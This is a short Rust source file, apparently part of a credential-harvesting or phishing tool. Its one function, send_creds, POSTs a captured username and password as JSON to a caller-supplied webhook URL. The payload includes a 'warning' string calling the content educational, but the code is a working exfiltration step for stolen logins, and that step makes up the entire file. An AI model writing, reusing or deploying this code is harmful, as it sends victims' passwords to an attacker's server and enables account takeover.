// webhook.rs
use serde_json::json;
use reqwest::blocking::Client;
use std::time::Duration;

pub fn send_creds(username: &str, password: &str, url: &str) {
    if url.is_empty() {
        return;
    }

    let client = Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .unwrap_or_else(|_| Client::new());

    let payload = json!({
        "username": username,
        "password": password,
        "warning": "This is educational content only - no real credentials were compromised"
    });

    match client.post(url)
        .json(&payload)
        .send() 
    {
        Ok(res) => {
            if !res.status().is_success() {
                eprintln!("[WEBHOOK] Failed to send data: {}", res.status());
            }
        }
        Err(e) => {
            eprintln!("[WEBHOOK] Error: {}", e);
        }
    }
}